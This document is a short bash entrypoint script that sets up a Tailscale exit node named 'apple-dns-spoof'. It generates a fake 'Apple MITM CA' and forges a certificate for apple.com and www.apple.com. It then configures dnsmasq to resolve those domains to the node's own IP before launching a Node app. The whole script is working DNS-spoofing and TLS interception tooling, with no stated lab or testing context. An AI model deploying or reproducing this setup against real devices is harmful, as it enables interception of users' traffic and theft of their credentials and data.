#!/bin/bash
echo "🔄 Initializing Environment..."

# Start Tailscale
tailscaled --tun=userspace-networking --socks5-server=localhost:1080 &
sleep 5

tailscale up --authkey=${TAILSCALE_AUTHKEY} \
  --hostname=apple-dns-spoof \
  --advertise-exit-node \
  --accept-dns=false

TS_IP=$(tailscale ip -4)
echo "📍 Tailscale IP: $TS_IP"

# === CERTIFICATE GENERATION ===
mkdir -p /certs
if [ ! -f /certs/apple.key ]; then
    echo "🔑 Generating Apple.com MITM Certificates..."
    openssl genrsa -out /certs/ca.key 2048
    openssl req -x509 -new -nodes -key /certs/ca.key -sha256 -days 3650 -out /certs/ca.crt -subj "/CN=Apple MITM CA"
    openssl genrsa -out /certs/apple.key 2048
    openssl req -new -key /certs/apple.key -out /certs/apple.csr -subj "/CN=apple.com"
    echo "subjectAltName = DNS:apple.com, DNS:www.apple.com" > /certs/apple.ext
    openssl x509 -req -in /certs/apple.csr -CA /certs/ca.crt -CAkey /certs/ca.key -CAcreateserial -out /certs/apple.crt -days 365 -extfile /certs/apple.ext
fi

# === DNSMASQ SETUP ===
cat > /etc/dnsmasq.conf <<EOF
port=53
listen-address=0.0.0.0
address=/apple.com/$TS_IP
address=/www.apple.com/$TS_IP
server=1.1.1.1
EOF

echo "🟢 Starting dnsmasq..."
dnsmasq

echo "🚀 Starting Node App..."
exec node index.js
